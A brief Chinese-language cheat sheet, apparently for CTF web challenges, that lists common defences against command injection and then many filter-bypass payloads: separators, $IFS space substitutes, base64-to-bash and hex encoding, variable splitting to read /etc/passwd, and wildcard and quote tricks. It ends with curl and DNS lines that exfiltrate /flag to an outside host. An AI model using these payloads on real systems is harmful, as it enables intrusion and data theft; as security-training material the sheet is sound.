# 命令执行 / RCE：常见防御与绕过

## 1. 常见防御

- 禁止或白名单限制危险函数：`system`、`exec`、`passthru`、`shell_exec`、`popen`、`proc_open`、`eval` 等
- 过滤命令分隔符：`;`、`|`、`&`、`$()`、`` ` ``、`\n`
- 过滤空格、关键词（如 `cat`、`flag`、`bash`）
- 禁用无参函数或限制参数内容（如只允许数字）
- 运行在沙箱或低权限

## 2. 绕过手段

### 命令分隔与拼接

- **分隔**：`;`、`|`、`||`、`&`、`&&`、`\n`、`%0a`
- **拼接**：`$()`、`` ` ``、变量 `${VAR}`

### 空格替代

- `$IFS`、`${IFS}`、`$IFS$9`、`<`、`<>`、`%09`(tab)、`%20`

### 关键词过滤

- **编码**：base64 `echo xxx|base64 -d|bash`；十六进制 `$(printf '\x63\x61\x74')`
- **变量**：`a=c;b=at;$a$b /etc/passwd`
- **通配符**：`/???/c?t`、`*`（视环境）
- **反斜杠**：`c\at`、`wh\oami`
- **引号**：`c'a't`、`c"a"t`

### 无参或短命令

- **无参 RCE**：利用 `getallheaders()`、`get_defined_vars()`、`current()`、`array_rand()` 等配合 PHP 特性
- **短标签**：`<?=`、`<%`（需开启 short_open_tag/asp_tags）

### 读文件

- `cat`、`tac`、`more`、`less`、`head`、`tail`、`nl`、`od`、`xxd`、`sort`、`uniq`
- `file` 读为 “flag” 时：`grep -r '' /`、`find / -read` 等

### 外带

- `curl http://vps/?x=$(cat /flag)`
- DNS：`nslookup $(cat /flag).xxx.dnslog.cn`
